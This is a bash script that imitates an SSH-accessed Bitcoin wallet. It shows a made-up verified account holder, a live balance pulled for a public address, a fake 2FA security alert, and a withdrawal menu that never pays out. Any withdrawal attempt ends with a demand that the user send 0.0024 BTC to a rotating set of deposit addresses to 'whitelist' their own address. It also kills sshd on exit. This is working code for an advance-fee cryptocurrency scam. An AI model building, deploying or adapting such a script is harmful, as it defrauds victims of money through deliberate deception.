#!/usr/bin/env bash
# shellcheck disable=SC2086
#created by Rzgar Espo

# Declare variables
walletAddr="1GQdrgqAbkeEPUef1UpiTc4X1mUHMcyuGW"
username=$(whoami)
serverName=$(hostname)

# Function for animating loading txt
animate_dots() {
  trap 'echo -e "\e[1m Exiting...\e[0m"; sleep 2; clear; pkill sshd; exit' INT
  string=$1
  iterations=$2
  sleep_time=$3
  for i in $(seq 1 $iterations); do
    printf "\r$string"
    for j in $(seq 1 $i); do
        printf "."
    done
    sleep $sleep_time
  done
  clear
}
# Function to display warning message for 2FA
warning2FA() {
    echo
    echo
    echo -e "         \e[31m\e[1m Security alert:\e[0m"
    echo " Two-factor authentication(2FA) for SSH connection"
    echo " is not configured. To enable 2FA, Access your User"
    echo " settings thtoughthe Phone or Desktop application, "
    echo " Select Account, Select Enable 2FA for SSH"
    echo
    echo " ************************"
}
# Function to prompt user for confirmation
ask(){
  trap 'echo -e "\e[1mExiting...\e[0m"; sleep 2; clear;pkill sshd; exit' INT

  while true; do
    echo -e "\e[1m Do you want to continue? [y/n]:\e[0m"
    read -r choice
    case $choice in
      INT)
        echo " Exiting..."
        exit
        ;;
          y|yes)
              clear
              userLogin
              walletInfo
              walletOption
        ;;
          n|no)
              clear
              echo
              animate_dots "\e[1m Exiting \e[0m " 3 1
              pkill sshd
              exit 0
              ;;
      *)
        echo echo $'Invalid choice. Type in  "yes" or "no" alternatively "y" or "n".'
        ;;
    esac
  done
}
# Function to display user login details
userLogin() {
    echo
    echo "************************"
    echo "    $(date +%Y/%m/%d)"
   echo -e "\e[1m Account holder:\e[0m  James Takahiro Teng \u2713 \e[2mverified\e[0m"
    echo -e "\e[1m User ID:\e[0m 167659109"
    echo -e "\e[1m User Name:\e[0m $username@$serverName"
    echo
    echo "************************"
}
# Function to get current price in USD
btcJsonPrise() {
      curl -s "https://api.coindesk.com/v1/bpi/currentprice.json" | jq -r '.bpi | .USD | .rate'
}
# Function to get final balance
finalBalance() {

  curl -s "https://blockchain.info/balance?active=$walletAddr" | jq '.[] | .final_balance'
}
# Function to get detailed information about the wallet
btcWalletAlltime() {
    jsonData=$(curl -s "https://blockchain.info/rawaddr/$walletAddr?limit=1")
    received=$(echo $jsonData | jq -r '.total_received/100000000')
    sent=$(echo $jsonData | jq -r '.total_sent/100000000')
    balance=$(echo $jsonData | jq -r '.final_balance/100000000')
    #echo "Total Received: $received"
    #echo "$received $sent $balance"
 }
# Function to get transaction history and values for the wallet
btcHistoryValue() {
 #curl -s "https://blockchain.info/rawaddr/$walletAddr?limit=2" | jq '.txs[].out[] | .addr, .value/100000000'
 curl -s "https://blockchain.info/rawaddr/$walletAddr?limit=3"  | jq --compact-output --raw-output 'range(0;3) as $i | .txs[$i].out[0].addr, .txs[$i].result/100000000'
}
# Function to print the header information
walletInfo() {
  
    echo
    echo -e "\e[1m Main Wallet Address:\e[0m $walletAddr"
    printf "\e[1m Final Balance(BTC):\e[0m %10f\n" "$(finalBalance /100000000)e-8"
    echo -e "\e[1m Current Price(USD):\e[0m $(btcJsonPrise)"
    echo "************************"
    echo

}
# Function to generate QR code for the wallet address
btcQRcode() {
  qrencode -s 3 -m 2 -t UTF8 "$walletAddr"
}
# Function to check if an address is valid
isValidAddress() {
    local address=$1
    local response
    response=$(curl -s "https://blockchain.info/q/addressbalance/$address")
    if [ "$response" -eq "$response" ] 2>/dev/null; then
        echo
        echo -e "\e[42m\e[30m\e[1m Address is valid.\e[0m"
        echo
        return 0
    else
        echo
        echo -e "\e[41m\e[37m\e[01 Address is not valid \e[0m"
        echo
        return 1
    fi
}
# Function to get a random deposit address
getDepositAddress() {
    # List of deposit addresses
    local -a depositAddresses=("bc1q3507ruzwz60kqsh4w67asmxjcxu3yq7u74jxzq" "bc1q7qq268np4my4u0g2qcw2ys7fwjgywapxnef3a0" "bc1q47xq565yw9cdj2efhzgwee3msw0dzmcna56h6r" "bc1qvr657clyu9m54nmcgmrkkw9q5gpd62jet79kxz" "bc1qkh0ma30e6r6xht37agxvdcjvavqqzmafrwugtk" "bc1q6azj8lhzthj2r63plflwdrn9y550ky6eelsng5" "bc1qyl8myegfe2a6rs4yc5t5hsmr049nc95rzf3fqp" "bc1qnx6qn6l5f2fhcm90qku9egxxnk9h9v8tske4rd" "bc1q3arwdqfg28hjvmfc62zq3kdur8r63nh4telpy8" "bc1qyu306rt2fk9r6q9r6l9c4xzjwayenjqkv8zxhw")
    local addressCount=${#depositAddresses[@]}
    local randomIndex=$((RANDOM % addressCount))
    local selectedAddress="${depositAddresses[$randomIndex]}"
    echo
    echo -e "\e[1m Displaying QR code\e[0m:"
    echo
    qrencode -s 3 -m 2 -t UTF8 "$selectedAddress"
    echo
    echo -e " \e[1m Trading wallet:\e[0m  $selectedAddress"
   
}
# Function for processing withdrawal
withdrawalProcess() {
   trap 'clear; echo " Canceled by user."; walletOption' INT
   echo -e "\e[1m Enter the amount for withdrawal:\e[0m"
   read -r withdrawAmount

 if ! [[ $withdrawAmount =~ ^-?[0-9]*\.?[0-9]+$ ]]; then
    echo "Please enter a valid number"
    withdrawalProcess

  else

    # check if entered amount is available in total balance
  if [[ $(echo "$(finalBalance) < $(echo "$withdrawAmount * 100000000" | bc -l)" | bc) -eq 1 ]]; then
        echo
        echo  -e "\e[1m\e[31m Insufficient funds. Please enter a smaller amount.\e[0m"
        echo
        withdrawalProcess
    else
        echo  -e "\e[1m Enter a BTC address for withdrawal:\e[0m"
        echo
        read -r withdrawAddr
        # Check if the entered address is valid
        if ! isValidAddress "$withdrawAddr"; then
            echo  -e "\e[1m The entered BTC address is not valid.\e[0m"
            echo " Please enter a valid BTC address."
            withdrawalProcess
            walletOption
        # check if entered address is not the same as $walletAddr
        elif [ "$withdrawAddr" = "$walletAddr" ]; then
            echo  -e "\e[1m\e[31m The entered BTC address is the same as the current wallet address.\e[0m"
            echo " Please enter a different BTC address."
            walletOption
        else
            # Check if the entered address is on the whitelist
            if ! isWhitelisted "$withdrawAddr"; then
                echo  -e  "\e[1m The entered BTC address is not on the SSH whitelist.\e[0m"
                echo " To whitelist this address, receiver has to send 0.0024 BTC to the deposit address."
                echo " Upon successful validation(3 network confirmation), 0.0018 BTC will be credited to"
                echo " whitelisted wallet."
                echo  -e  "\e[1m\e[31m Disable manual whitelist feature by activating 2FA for SSH connection.\e[0m"
                getDepositAddress
            else
                echo "Withdrawing $withdrawAmount BTC to $withdrawAddr..."
                # Code to process withdrawal to the specified address
            fi
        fi
    fi
    fi
}
# Function to check if an address is on the whitelist
isWhitelisted() {
    # Whitelisted addresses
    local -a whitelist=("1GQdrgqAbkeEPUef1UpiTc4X1mUHMcyuGW" "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    for addr in "${whitelist[@]}"; do
        if [ "$addr" == "$1" ]; then
            return 0
        fi
    done
    return 1
}
# Function to display wallet options
walletOption() {

    echo
    echo
    echo " 1) Deposite"
    echo " 2) Withdrawal"
    echo " 3) Transactions"
    echo " 4) Exit"
    echo
    echo -e "\e[1m Select an option:\e[0m"

    read -r whichOption

    case "$whichOption" in

    1 | Deposite | deposite)
      clear
      walletInfo
      echo " Deposite BTC to the Trading wallet:"
      echo 
      getDepositAddress
      
      echo  -e " \e[1m Network:\e[0m Bitcoin | SegWit"
      echo  -e " \e[1m Minimum deposit:\e[0m  0.00233937"
      echo  -e " \e[1m Expected arrival:\e[0m 3 network confirmation"
      echo  -e "\e[31m if you deposit via another network your asset may be lost.\e[0m"
      echo
      echo "************************"
      walletOption
      ;;

    2 | Withdrawal | withdrawal)
      clear
      walletInfo
      echo -n "Withdrawal"
      echo

      withdrawalProcess

      echo "************************"
      walletOption
      ;;

    3 | Transactions | transactions)
      clear
      walletInfo
      echo " Alltime Activity"
      echo
      btcWalletAlltime
      echo -e "\e[1m Total Received:\e[0m $received"
      echo -e "\e[1m Total Sent:\e[0m $sent"
      #echo -e "\e[1m Final Balance:\e[0m $balance"
      echo "************************"
      echo
      echo " Last Transactions | Amounts:"
      echo
      #btcHistory
      btcHistoryValue
      echo
      echo "************************"
      walletOption
      ;;


    4 | Exit | exit | x)
      clear
      animate_dots "\e[1m Exiting \e[0m " 3 1
    pkill sshd
      exit 0
      ;;

    *)
    clear
    echo
    echo " Invalid option. Please try again."
      walletOption
      ;;
  esac

}
echo
animate_dots "loading the wallet " 3 1
warning2FA
ask
